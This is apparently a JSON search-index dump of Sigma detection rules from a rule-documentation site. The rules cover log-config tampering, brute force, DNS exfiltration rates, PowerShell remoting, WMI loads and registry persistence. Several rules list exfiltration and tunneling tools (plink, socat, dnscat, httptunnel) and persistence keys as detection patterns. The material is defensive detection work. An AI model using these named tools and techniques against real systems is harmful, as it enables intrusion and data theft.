https://github.com/Neo23x0/auditd/blob/master/audit.rules - self experience date: 2019/10/25 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: PATH name: - /etc/audit/* - /etc/libaudit.conf - /etc/audisp/* condition: selection fields: - exe - comm - key falsepositives: - Legitimate administrative activity level: high tags: - attack.defense_evasion - attack.t1562.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_auditing_config_change.yml/","tags":["attack.defense_evasion","attack.t1562.006"],"title":"Auditing Configuration Changes on Linux Host"},{"categories":null,"contents":"Detects many authentication failures from one source to one destination which is may indicate Brute Force activity\nKnown false-positives Inventarization Penetration testing Vulnerability scanner Legitimate application Raw rule (edit) title: Brute Force id: 53c7cca0-2901-493a-95db-d00d6fcf0a37 status: test description: Detects many authentication failures from one source to one destination which is may indicate Brute Force activity author: Aleksandr Akhremchik, oscd.community date: 2019/10/25 modified: 2021/11/27 logsource: category: authentication detection: selection: action: failure timeframe: 600s condition: selection | count(category) by dst_ip \u0026gt; 30 fields: - src_ip - dst_ip - user falsepositives: - Inventarization - Penetration testing - Vulnerability scanner - Legitimate application level: medium tags: - attack.credential_access - attack.t1110 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/generic/generic_brute_force.yml/","tags":["attack.credential_access","attack.t1110"],"title":"Brute Force"},{"categories":null,"contents":"Detect changes of syslog daemons configuration files\nKnown false-positives Legitimate administrative activity References self experience Raw rule (edit) title: Logging Configuration Changes on Linux Host id: c830f15d-6f6e-430f-8074-6f73d6807841 status: test description: Detect changes of syslog daemons configuration files author: Mikhail Larin, oscd.community references: - self experience date: 2019/10/25 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: \u0026#39;PATH\u0026#39; name: - /etc/syslog.conf - /etc/rsyslog.conf - /etc/syslog-ng/syslog-ng.conf condition: selection fields: - exe - comm - key falsepositives: - Legitimate administrative activity level: high tags: - attack.defense_evasion - attack.t1562.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_logging_config_change.yml/","tags":["attack.defense_evasion","attack.t1562.006"],"title":"Logging Configuration Changes on Linux Host"},{"categories":null,"contents":"Detects abusing Windows 10 Narrator\u0026rsquo;s Feedback-Hub\nKnown false-positives unknown References https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html Raw rule (edit) title: Narrator\u0026#39;s Feedback-Hub Persistence id: f663a6d9-9d1b-49b8-b2b1-0637914d199a status: test description: Detects abusing Windows 10 Narrator\u0026#39;s Feedback-Hub author: Dmitriy Lifanov, oscd.community references: - https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html date: 2019/10/25 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection1: EventType: DeleteValue TargetObject|endswith: \u0026#39;\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\DelegateExecute\u0026#39; selection2: TargetObject|endswith: \u0026#39;\\AppXypsaf9f1qserqevf0sws76dx4k9a5206\\Shell\\open\\command\\(Default)\u0026#39; condition: 1 of selection* falsepositives: - unknown level: high tags: - attack.persistence - attack.t1547.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_narrator_feedback_persistance.yml/","tags":["attack.persistence","attack.t1547.001"],"title":"Narrator's Feedback-Hub Persistence"},{"categories":null,"contents":"Detects network connections and DNS queries initiated by Regsvr32.exe\nKnown false-positives unknown References https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/ https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md Raw rule (edit) title: Regsvr32 Network Activity id: c7e91a02-d771-4a6d-a700-42587e0b1095 description: Detects network connections and DNS queries initiated by Regsvr32.exe references: - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/ - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md author: Dmitriy Lifanov, oscd.community status: experimental date: 2019/10/25 modified: 2021/09/21 logsource: category: network_connection product: windows detection: selection: Image|endswith: \u0026#39;\\regsvr32.exe\u0026#39; condition: selection fields: - ComputerName - User - Image - DestinationIp - DestinationPort falsepositives: - unknown level: high tags: - attack.execution - attack.t1559.001 - attack.defense_evasion - attack.t1218.010 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml/","tags":["attack.execution","attack.t1559.001","attack.defense_evasion","attack.t1218.010"],"title":"Regsvr32 Network Activity"},{"categories":null,"contents":"Detects persitence via netsh helper\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.007/T1546.007.md https://attack.mitre.org/software/S0108/ Raw rule (edit) title: Suspicious Netsh DLL Persistence id: 56321594-9087-49d9-bf10-524fe8479452 status: test description: Detects persitence via netsh helper author: Victor Sergeev, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.007/T1546.007.md - https://attack.mitre.org/software/S0108/ date: 2019/10/25 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; CommandLine|contains|all: - \u0026#39;add\u0026#39; - \u0026#39;helper\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.t1546.007 - attack.s0108 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_netsh_dll_persistence.yml/","tags":["attack.privilege_escalation","attack.t1546.007","attack.s0108"],"title":"Suspicious Netsh DLL Persistence"},{"categories":null,"contents":"Detects service path modification to PowerShell or cmd.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md Raw rule (edit) title: Suspicious Service Path Modification id: 138d3531-8793-4f50-a2cd-f291b2863d78 status: test description: Detects service path modification to PowerShell or cmd. author: Victor Sergeev, oscd.community references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md date: 2019/10/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: \u0026#39;\\sc.exe\u0026#39; CommandLine|contains|all: - \u0026#39;config\u0026#39; - \u0026#39;binpath\u0026#39; selection_2: CommandLine|contains: - \u0026#39;powershell\u0026#39; - \u0026#39;cmd\u0026#39; condition: selection_1 and selection_2 fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_service_path_modification.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1543.003"],"title":"Suspicious Service Path Modification"},{"categories":null,"contents":"Dnscat exfiltration tool execution\nKnown false-positives Legitimate usage of PowerShell Dnscat2 — DNS Exfiltration tool (unlikely) Raw rule (edit) title: Dnscat Execution id: a6d67db4-6220-436d-8afc-f3842fe05d43 description: Dnscat exfiltration tool execution status: experimental author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/10/16 tags: - attack.exfiltration - attack.t1048 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: \u0026#39;Start-Dnscat2\u0026#39; condition: selection falsepositives: - Legitimate usage of PowerShell Dnscat2 — DNS Exfiltration tool (unlikely) level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_dnscat_execution.yml/","tags":["attack.exfiltration","attack.t1048","attack.execution","attack.t1059.001"],"title":"Dnscat Execution"},{"categories":null,"contents":"Execution of well known tools for data exfiltration and tunneling\nKnown false-positives Legitimate Administrator using tools Raw rule (edit) title: Exfiltration and Tunneling Tools Execution id: c75309a3-59f8-4a8d-9c2c-4c927ad50555 status: test description: Execution of well known tools for data exfiltration and tunneling author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\plink.exe\u0026#39; - \u0026#39;\\socat.exe\u0026#39; - \u0026#39;\\stunnel.exe\u0026#39; - \u0026#39;\\httptunnel.exe\u0026#39; condition: selection falsepositives: - Legitimate Administrator using tools level: medium tags: - attack.exfiltration - attack.command_and_control - attack.t1041 - attack.t1572 - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exfiltration_and_tunneling_tools_execution.yml/","tags":["attack.exfiltration","attack.command_and_control","attack.t1041","attack.t1572","attack.t1071.001"],"title":"Exfiltration and Tunneling Tools Execution"},{"categories":null,"contents":"High DNS queries bytes amount from host per short period of time\nKnown false-positives Legitimate high DNS bytes out rate to domain name which should be added to whitelist Raw rule (edit) title: High DNS Bytes Out id: 3b6e327d-8649-4102-993f-d25786481589 status: experimental description: High DNS queries bytes amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 logsource: category: firewall detection: selection: dst_port: 53 timeframe: 1m condition: selection | sum(message_size) by src_ip \u0026gt; 300000 falsepositives: - Legitimate high DNS bytes out rate to domain name which should be added to whitelist level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_firewall_high_dns_bytes_out.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"High DNS Bytes Out"},{"categories":null,"contents":"High DNS queries bytes amount from host per short period of time\nKnown false-positives Legitimate high DNS bytes out rate to domain name which should be added to whitelist Raw rule (edit) title: High DNS Bytes Out id: 0f6c1bf5-70a5-4963-aef9-aab1eefb50bd status: experimental description: High DNS queries bytes amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 logsource: category: dns detection: selection: query: \u0026#39;*\u0026#39; timeframe: 1m condition: selection | sum(question_length) by src_ip \u0026gt; 300000 falsepositives: - Legitimate high DNS bytes out rate to domain name which should be added to whitelist level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_high_dns_bytes_out.yml/","tags":["attack.exfiltration","attack.t1048.003"],"title":"High DNS Bytes Out"},{"categories":null,"contents":"High DNS requests amount from host per short period of time\nKnown false-positives Legitimate high DNS requests rate to domain name which should be added to whitelist Raw rule (edit) title: High DNS Requests Rate id: 51186749-7415-46be-90e5-6914865c825a status: experimental description: High DNS requests amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 logsource: category: firewall detection: selection: dst_port: 53 timeframe: 1m condition: selection | count() by src_ip \u0026gt; 1000 falsepositives: - Legitimate high DNS requests rate to domain name which should be added to whitelist level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_firewall_high_dns_requests_rate.yml/","tags":["attack.exfiltration","attack.t1048.003","attack.command_and_control","attack.t1071.004"],"title":"High DNS Requests Rate"},{"categories":null,"contents":"High DNS requests amount from host per short period of time\nKnown false-positives Legitimate high DNS requests rate to domain name which should be added to whitelist Raw rule (edit) title: High DNS Requests Rate id: b4163085-4001-46a3-a79a-55d8bbbc7a3a status: experimental description: High DNS requests amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 logsource: category: dns detection: selection: query: \u0026#39;*\u0026#39; timeframe: 1m condition: selection | count() by src_ip \u0026gt; 1000 falsepositives: - Legitimate high DNS requests rate to domain name which should be added to whitelist level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_high_dns_requests_rate.yml/","tags":["attack.exfiltration","attack.t1048.003","attack.command_and_control","attack.t1071.004"],"title":"High DNS Requests Rate"},{"categories":null,"contents":"Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution\nKnown false-positives Legitimate high DNS NULL requests rate to domain name which should be added to whitelist Raw rule (edit) title: High NULL Records Requests Rate id: 44ae5117-9c44-40cf-9c7c-7edad385ca70 status: test description: Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: dns detection: selection: record_type: \u0026#39;NULL\u0026#39; timeframe: 1m condition: selection | count() by src_ip \u0026gt; 50 falsepositives: - Legitimate high DNS NULL requests rate to domain name which should be added to whitelist level: medium tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_high_null_records_requests_rate.yml/","tags":["attack.exfiltration","attack.t1048.003","attack.command_and_control","attack.t1071.004"],"title":"High NULL Records Requests Rate"},{"categories":null,"contents":"Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution\nKnown false-positives Legitimate high DNS TXT requests rate to domain name which should be added to whitelist Raw rule (edit) title: High TXT Records Requests Rate id: f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35 status: test description: Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: dns detection: selection: record_type: \u0026#39;TXT\u0026#39; timeframe: 1m condition: selection | count() by src_ip \u0026gt; 50 falsepositives: - Legitimate high DNS TXT requests rate to domain name which should be added to whitelist level: medium tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_high_txt_records_requests_rate.yml/","tags":["attack.exfiltration","attack.t1048.003","attack.command_and_control","attack.t1071.004"],"title":"High TXT Records Requests Rate"},{"categories":null,"contents":"Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques\nKnown false-positives Legitimate OpenVPN TAP insntallation Raw rule (edit) title: Tap Driver Installation id: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9 description: Well-known TAP software installation. Possible preparation for data exfiltration using tunnelling techniques status: experimental author: Daniil Yugoslavskiy, Ian Davis, oscd.community date: 2019/10/24 modified: 2021/11/30 tags: - attack.exfiltration - attack.t1048 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ImagePath|contains: \u0026#39;tap0901\u0026#39; condition: selection falsepositives: - Legitimate OpenVPN TAP insntallation level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_tap_driver_installation.yml/","tags":["attack.exfiltration","attack.t1048"],"title":"Tap Driver Installation"},{"categories":null,"contents":"Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques\nKnown false-positives Legitimate OpenVPN TAP insntallation Raw rule (edit) title: Tap Installer Execution id: 99793437-3e16-439b-be0f-078782cf953d status: test description: Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques author: Daniil Yugoslavskiy, Ian Davis, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\tapinstall.exe\u0026#39; condition: selection falsepositives: - Legitimate OpenVPN TAP insntallation level: medium tags: - attack.exfiltration - attack.t1048 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_tap_installer_execution.yml/","tags":["attack.exfiltration","attack.t1048"],"title":"Tap Installer Execution"},{"categories":null,"contents":"Detects a change in profile.ps1 of the Powershell profile\nKnown false-positives System administrator create Powershell profile manually References https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/ Raw rule (edit) title: Powershell Profile.ps1 Modification id: b5b78988-486d-4a80-b991-930eff3ff8bf status: test description: Detects a change in profile.ps1 of the Powershell profile author: HieuTT35 references: - https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/ date: 2019/10/24 modified: 2021/11/27 logsource: product: windows category: file_event detection: target1: TargetFilename|contains|all: - \u0026#39;\\My Documents\\PowerShell\\\u0026#39; - \u0026#39;\\profile.ps1\u0026#39; target2: TargetFilename|contains|all: - \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\u0026#39; - \u0026#39;\\profile.ps1\u0026#39; condition: target1 or target2 falsepositives: - System administrator create Powershell profile manually level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1546.013 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_suspicious_powershell_profile_create.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.013"],"title":"Powershell Profile.ps1 Modification"},{"categories":null,"contents":"Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\nKnown false-positives Programs using PowerShell directly without invocation of a dedicated interpreter MSP Detection Searcher Citrix ConfigSync.ps1 References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html Raw rule (edit) title: Alternate PowerShell Hosts id: 64e8e417-c19a-475a-8d19-98ea705394cc description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe status: test date: 2019/08/11 modified: 2022/02/16 author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo: \u0026#39;*\u0026#39; filter: ContextInfo|contains: \u0026#39;powershell.exe\u0026#39; # Host Application=...powershell.exe or Application hote=...powershell.exe in French Win10 event filter_citrix: ContextInfo|contains: \u0026#39;ConfigSyncRun.exe\u0026#39; condition: selection and not 1 of filter* falsepositives: - Programs using PowerShell directly without invocation of a dedicated interpreter - MSP Detection Searcher - Citrix ConfigSync.ps1 level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_module/posh_pm_alternate_powershell_hosts.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Alternate PowerShell Hosts"},{"categories":null,"contents":"Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe\nKnown false-positives Programs using PowerShell directly without invocation of a dedicated interpreter. References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html Raw rule (edit) title: Alternate PowerShell Hosts Pipe id: 58cb02d5-78ce-4692-b3e1-dce850aae41a status: test description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe author: Roberto Rodriguez @Cyb3rWard0g, Tim Shelton references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html date: 2019/09/12 modified: 2022/02/16 logsource: product: windows category: pipe_created detection: selection: PipeName|startswith: \u0026#39;\\PSHost\u0026#39; filter1: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\powershell_ise.exe\u0026#39; - \u0026#39;\\WINDOWS\\System32\\sdiagnhost.exe\u0026#39; - \u0026#39;\\WINDOWS\\System32\\wsmprovhost.exe\u0026#39; - \u0026#39;\\Windows\\system32\\dsac.exe\u0026#39; - \u0026#39;\\Windows\\system32\\wbem\\wmiprvse.exe\u0026#39; - \u0026#39;\\ForefrontActiveDirectoryConnector.exe\u0026#39; - \u0026#39;c:\\windows\\system32\\inetsrv\\w3wp.exe\u0026#39; # this is sad :,( but it triggers FPs on Exchange servers filter2: Image: null filter3: # Microsoft SQL Server\\130\\Tools\\ Image|contains|all: - \u0026#39;:\\Program Files\u0026#39; - \u0026#39;\\Microsoft SQL Server\\\u0026#39; Image|endswith: \u0026#39;\\Tools\\Binn\\SQLPS.exe\u0026#39; filter4: Image|startswith: - \u0026#39;C:\\Program Files\\Citrix\\\u0026#39; - \u0026#39;C:\\Program Files\\Microsoft\\Exchange Server\\\u0026#39; condition: selection and not 1 of filter* fields: - ComputerName - User - Image - PipeName falsepositives: - Programs using PowerShell directly without invocation of a dedicated interpreter. level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/pipe_created/pipe_created_alternate_powershell_hosts_pipe.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Alternate PowerShell Hosts Pipe"},{"categories":null,"contents":"Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent.\nKnown false-positives Legitimate programs executing PowerShell scripts References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html Raw rule (edit) title: Non Interactive PowerShell id: f4bbd493-b796-416e-bbf2-121235348529 description: Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent. status: experimental date: 2019/09/12 modified: 2021/05/10 author: Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements) references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html tags: - attack.execution - attack.t1059.001 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\powershell.exe\u0026#39; filter: ParentImage|endswith: - \u0026#39;\\explorer.exe\u0026#39; - \u0026#39;\\CompatTelRunner.exe\u0026#39; condition: selection and not filter falsepositives: - Legitimate programs executing PowerShell scripts level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_non_interactive_powershell.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Non Interactive PowerShell"},{"categories":null,"contents":"Detects remote PowerShell connections by monitoring network outbound connections to ports 5985 or 5986 from a non-network service account.\nKnown false-positives Legitimate usage of remote PowerShell, e.g. remote administration and monitoring. References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html Raw rule (edit) title: Remote PowerShell Session id: c539afac-c12a-46ed-b1bd-5a5567c9f045 status: test description: Detects remote PowerShell connections by monitoring network outbound connections to ports 5985 or 5986 from a non-network service account. author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html date: 2019/09/12 modified: 2022/02/16 logsource: category: network_connection product: windows detection: selection: DestinationPort: - 5985 - 5986 filter: User|contains: - \u0026#39;AUTHORI\u0026#39; - \u0026#39;AUTORI\u0026#39; condition: selection and not filter falsepositives: - Legitimate usage of remote PowerShell, e.g. remote administration and monitoring. level: high tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_remote_powershell_session_network.yml/","tags":["attack.execution","attack.t1059.001","attack.lateral_movement","attack.t1021.006"],"title":"Remote PowerShell Session"},{"categories":null,"contents":"Detects remote PowerShell sessions\nKnown false-positives Legitimate use remote PowerShell sessions References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html Raw rule (edit) title: Remote PowerShell Session id: 96b9f619-aa91-478f-bacb-c3e50f8df575 description: Detects remote PowerShell sessions status: test date: 2019/08/10 modified: 2021/10/16 author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo|contains|all: - \u0026#39; = ServerRemoteHost \u0026#39; # HostName: \u0026#39;ServerRemoteHost\u0026#39; french : Nom d’hôte = - \u0026#39;wsmprovhost.exe\u0026#39; # HostApplication|contains: \u0026#39;wsmprovhost.exe\u0026#39; french Application hôte = condition: selection falsepositives: - Legitimate use remote PowerShell sessions level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_module/posh_pm_remote_powershell_session.yml/","tags":["attack.execution","attack.t1059.001","attack.lateral_movement","attack.t1021.006"],"title":"Remote PowerShell Session"},{"categories":null,"contents":"Detects basic PowerShell Remoting (WinRM) by monitoring for network inbound connections to ports 5985 OR 5986\nKnown false-positives Legitimate use of remote PowerShell execution References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html Raw rule (edit) title: Remote PowerShell Sessions Network Connections (WinRM) id: 13acf386-b8c6-4fe0-9a6e-c4756b974698 description: Detects basic PowerShell Remoting (WinRM) by monitoring for network inbound connections to ports 5985 OR 5986 status: experimental date: 2019/09/12 modified: 2021/05/21 author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html tags: - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 5156 DestPort: - 5985 - 5986 LayerRTID: 44 condition: selection falsepositives: - Legitimate use of remote PowerShell execution level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_remote_powershell_session.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Remote PowerShell Sessions Network Connections (WinRM)"},{"categories":null,"contents":"Detects non wmiprvse loading WMI modules\nKnown false-positives Unknown References https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190811201010.html Raw rule (edit) title: WMI Modules Loaded id: 671bb7e3-a020-4824-a00e-2ee5b55f385e description: Detects non wmiprvse loading WMI modules status: experimental date: 2019/08/10 modified: 2022/01/12 author: Roberto Rodriguez @Cyb3rWard0g references: - https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190811201010.html tags: - attack.execution - attack.t1047 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - \u0026#39;\\wmiclnt.dll\u0026#39; - \u0026#39;\\WmiApRpl.dll\u0026#39; - \u0026#39;\\wmiprov.dll\u0026#39; - \u0026#39;\\wmiutils.dll\u0026#39; - \u0026#39;\\wbemcomn.dll\u0026#39; - \u0026#39;\\wbemprox.dll\u0026#39; - \u0026#39;\\WMINet_Utils.dll\u0026#39; - \u0026#39;\\wbemsvc.dll\u0026#39; - \u0026#39;\\fastprox.dll\u0026#39; filter: Image|endswith: - \u0026#39;\\WmiPrvSE.exe\u0026#39; - \u0026#39;\\WmiApSrv.exe\u0026#39; - \u0026#39;\\svchost.exe\u0026#39; - \u0026#39;\\DeviceCensus.exe\u0026#39; - \u0026#39;\\CompatTelRunner.exe\u0026#39; - \u0026#39;\\sdiagnhost.exe\u0026#39; - \u0026#39;\\SIHClient.exe\u0026#39; - \u0026#39;\\ngentask.exe\u0026#39; # c:\\Windows\\Microsoft.NET\\Framework(64)\\ngentask.exe - \u0026#39;\\windows\\system32\\taskhostw.exe\u0026#39; # c:\\windows\\system32\\taskhostw.exe - \u0026#39;\\windows\\system32\\MoUsoCoreWorker.exe\u0026#39; # c:\\windows\\System32\\MoUsoCoreWorker.exe on win10 20H04 at least - \u0026#39;\\windows\\system32\\wbem\\WMIADAP.exe\u0026#39; # https://github.com/SigmaHQ/sigma/issues/1871 - \u0026#39;C:\\Windows\\Sysmon64.exe\u0026#39; - \u0026#39;C:\\Windows\\Sysmon.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\wbem\\unsecapp.exe\u0026#39; - \u0026#39;\\logman.exe\u0026#39; - \u0026#39;\\systeminfo.exe\u0026#39; - \u0026#39;\\nvcontainer.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\wbem\\WMIC.exe\u0026#39; - \u0026#39;\\explorer.exe\u0026#39; - \u0026#39;\\opera_autoupdate.exe\u0026#39; - \u0026#39;\\MsMpEng.exe\u0026#39; - \u0026#39;\\thor64.exe\u0026#39; - \u0026#39;\\thor.exe\u0026#39; filter_generic: # rule caused many false positives in different productive environments - using this filter to exclude all programs that run from folders that only the administrative groups should have access to Image|startswith: - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; condition: selection and not filter and not filter_generic fields: - ComputerName - User - Image - ImageLoaded falsepositives: - Unknown level: informational # too many false positives ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_wmi_module_load.yml/","tags":["attack.execution","attack.t1047"],"title":"WMI Modules Loaded"},{"categories":null,"contents":"Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables.\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md Raw rule (edit) title: Winlogon Helper DLL id: 851c506b-6b7c-4ce2-8802-c703009d03c0 status: experimental description: Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. author: Timur Zinniatullin, oscd.community date: 2019/10/21 modified: 2021/10/16 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: \u0026#39;CurrentVersion\\Winlogon\u0026#39; selection2: ScriptBlockText|contains: - \u0026#39;Set-ItemProperty\u0026#39; - \u0026#39;New-Item\u0026#39; condition: selection and selection2 falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1547.004 